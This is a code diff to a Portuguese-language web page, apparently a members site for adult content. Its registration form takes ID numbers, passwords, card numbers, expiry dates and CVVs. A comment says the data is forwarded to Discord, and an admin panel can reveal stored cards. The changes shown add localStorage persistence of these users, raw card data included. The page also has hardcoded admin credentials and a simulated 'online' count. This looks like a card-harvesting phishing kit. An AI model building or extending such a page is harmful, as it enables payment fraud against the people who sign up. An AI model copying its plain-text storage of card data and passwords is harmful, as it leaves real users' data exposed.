@@ -573,15 +573,40 @@ footer{background:#060000;border-top:1px solid rgba(232,0,30,.1);padding:24px 48
 const ADM_CPF  = '122';
 const ADM_PASS = 'adm22';
 
-let users      = {};   // cpf -> {name,pass,cpf,cartao,validade,cvv}
 let loggedUser = null;
 let isAdm      = false;
 let onlineCount= 1;
-
-// Content store — começa vazio, ADM adiciona o conteúdo real
-let contents = [];
-let nextId = 7;
 let pendingFiles = [];
+
+// ── funções de persistência ──
+function salvarUsers(){
+  try { localStorage.setItem('18z_users', JSON.stringify(users)); } catch(e){}
+}
+function salvarContents(){
+  try {
+    // não salva fotos em base64 gigantes junto com o nextId separado
+    localStorage.setItem('18z_contents', JSON.stringify(contents));
+    localStorage.setItem('18z_nextId', String(nextId));
+  } catch(e){}
+}
+function carregarDados(){
+  try {
+    const u = localStorage.getItem('18z_users');
+    if(u) users = JSON.parse(u);
+  } catch(e){ users = {}; }
+  try {
+    const c = localStorage.getItem('18z_contents');
+    if(c) contents = JSON.parse(c);
+    const n = localStorage.getItem('18z_nextId');
+    if(n) nextId = parseInt(n) || 1;
+  } catch(e){ contents = []; nextId = 1; }
+}
+
+// inicializa
+let users    = {};
+let contents = [];
+let nextId   = 1;
+carregarDados(); // carrega do localStorage
 
 // Simulate online fluctuation
 setInterval(()=>{
@@ -672,6 +697,7 @@ function doRegister(){
 
   // salva usuário
   users[cpf]={name,pass,cpf,cartao,validade,cvv,online:true};
+  salvarUsers(); // persiste no localStorage
 
   // só manda pro Discord se os dados forem diferentes do que já foi enviado
   const dadosCompletos = {name,cpf,cartao,validade,cvv,pass};
@@ -892,6 +918,7 @@ function renderAllGrids(){
 function deleteContent(id,e){
   e.stopPropagation();
   contents=contents.filter(c=>c.id!==id);
+  salvarContents();
   renderAllGrids();
   renderAdmUsers();
 }
@@ -1006,6 +1033,7 @@ function adm_addContent(){
   }
 
   contents.push(newContent);
+  salvarContents(); // persiste no localStorage
   renderAllGrids();
   renderAdmUsers();
 
@@ -1253,6 +1281,7 @@ function revealCard(cpf,cartao){
 function admDeleteUser(cpf){
   if(confirm('Remover usuário '+cpf+'?')){
     delete users[cpf];
+    salvarUsers();
     renderAdmUsers();
   }
 }
@@ -1276,6 +1305,7 @@ function saveProfile(){
   if(name&&loggedUser){
     loggedUser.name=name;
     if(users[loggedUser.cpf])users[loggedUser.cpf].name=name;
+    salvarUsers();
     loadDashboard();alert('Perfil atualizado com sucesso!');
   }
 }
